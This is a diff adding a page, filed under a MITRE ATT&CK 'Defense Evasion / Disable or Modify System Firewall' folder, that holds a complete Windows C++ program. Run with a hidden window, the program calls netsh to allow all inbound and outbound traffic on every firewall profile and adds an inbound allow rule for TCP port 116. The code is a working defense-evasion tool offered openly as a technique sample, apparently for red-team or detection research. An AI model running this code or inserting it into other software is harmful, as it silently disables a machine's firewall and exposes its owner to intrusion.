@@ -1,0 +1,51 @@
+---
+title: "Modifysystemfirewall"
+folder: "07. Defense Evasion/T1562 Impair Defenses/.004.Disable or Modify System Firewall"
+---
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+void allow() {
+
+    const char* command = "netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound ";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+void port() {
+
+    const char* command = "netsh advfirewall firewall add rule name=\"test1\" dir=in action=allow protocol=TCP localport=116";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    allow();
+    port();
+    return 0;
+}
